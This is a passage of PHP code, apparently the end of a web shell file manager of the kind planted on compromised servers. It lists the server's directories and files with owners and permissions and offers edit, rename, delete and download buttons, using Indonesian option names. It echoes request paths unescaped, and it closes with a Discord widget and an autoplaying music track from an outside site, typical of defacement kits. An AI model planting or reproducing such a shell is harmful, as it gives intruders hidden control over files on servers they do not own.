foreach($scandir as $dir){
	$dt = date("Y-m-d H:i:s", filemtime("$path/$dir"));
	if(function_exists('posix_getpwuid')) {
		$downer = @posix_getpwuid(fileowner("$path/$dir"));
		$downer = $downer['name'];
	} else {
		$downer = fileowner("$path/$dir");
	}
	if(function_exists('posix_getgrgid')) {
		$dgrp = @posix_getgrgid(filegroup("$path/$dir"));
		$dgrp = $dgrp['name'];
	} else {
		$dgrp = filegroup("$path/$dir");
	}
if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
echo "
<tr>
	<td><i class='bi bi-folder-fill'></i><a class='text-decoration-none text-secondary' href=\"?path=$path/$dir\">$dir</a></td>
	<td class='text-center'>$dt</td>
	<td class='text-center'>-</td>
	<td class='text-center'>$downer<gr>:</gr>$dgrp</td>
	<td class='text-center'>";
if(is_writable("$path/$dir")) echo '<gr>';
elseif(!is_readable("$path/$dir")) echo '<rd>';
echo p("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</gr></rd></td>';
echo "
	<td class=\"text-center\">
	<form method=\"POST\" action=\"?option&path=$path\">
		<div class=\"btn-group\">
			<button class=\"btn btn-outline-light btn-sm\" name=\"opt\" value=\"ganti_nama\"><i class='bi bi-pencil-fill'></i></button>
			<button class=\"btn btn-outline-light btn-sm\" name=\"opt\" value=\"hapus\"><i class='bi bi-trash-fill'></i></button>
		</div>
		<input type=\"hidden\" name=\"type\" value=\"dir\">
		<input type=\"hidden\" name=\"name\" value=\"$dir\">
		<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
	</form>
	</td>
</tr>";
}
foreach($scandir as $file){
	$ft = date("Y-m-d H:i:s", filemtime("$path/$file"));
	if(!is_file($path.'/'.$file)) continue;
	if(function_exists('posix_getpwuid')) {
		$fowner = @posix_getpwuid(fileowner("$path/$file"));
		$fowner = $fowner['name'];
	} else {
		$fowner = fileowner("$path/$file");
	}
	if(function_exists('posix_getgrgid')) {
		$fgrp = @posix_getgrgid(filegroup("$path/$file"));
		$fgrp = $fgrp['name'];
	} else {
		$fgrp = filegroup("$path/$file");
	}
echo "
<tr>
	<td><i class='bi bi-file-earmark-code-fill'></i><a class='text-decoration-none text-secondary' href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
	<td class='text-center'>$ft</td>
	<td class='text-center'>".sz(filesize($file))."</td>
	<td class='text-center'>$fowner<gr>:</gr>$fgrp</td>
	<td class='text-center'>";
if(is_writable("$path/$file")) echo '<gr>';
elseif(!is_readable("$path/$file")) echo '<rd>';
echo p("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</gr></rd></td>';
echo "
	<td class=\"text-center\">
		<form method=\"POST\" action=\"?option&path=$path\">
			<div class=\"btn-group\">
				<button class=\"btn btn-outline-light btn-sm\" name=\"opt\" value=\"edit\"><i class='bi bi-pencil-square'></i></button>
				<button class=\"btn btn-outline-light btn-sm\" name=\"opt\" value=\"ganti_nama\"><i class='bi bi-pencil-fill'></i></button>
				<button class=\"btn btn-outline-light btn-sm\" name=\"opt\" value=\"download\"><i class='bi bi-download'></i></button>
				<button class=\"btn btn-outline-light btn-sm\" name=\"opt\" value=\"hapus\"><i class='bi bi-trash-fill'></i></button>
			</div>
			<input type=\"hidden\" name=\"type\" value=\"file\">
			<input type=\"hidden\" name=\"name\" value=\"$file\">
			<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
		</form>
	</td>
</tr>";

	}
}
?>
<script src="https://cdn.jsdelivr.net/npm/@widgetbot/crate@3" async defer>
  new Crate({
    server: '1039593642513412137',
    channel: '1039593642983178282'
  })
</script>
<audio src="http://vajirawickramasingha.com/phonk.mp3" autoplay="autoplay" loop="loop" id="lagu">

</audio>
<audio>

</tbody>
</table>
<div class='text-secondary'>&copy; <?php echo " ".date('Y')." $_n";?></div>
</div>
</div>
</body>
</html>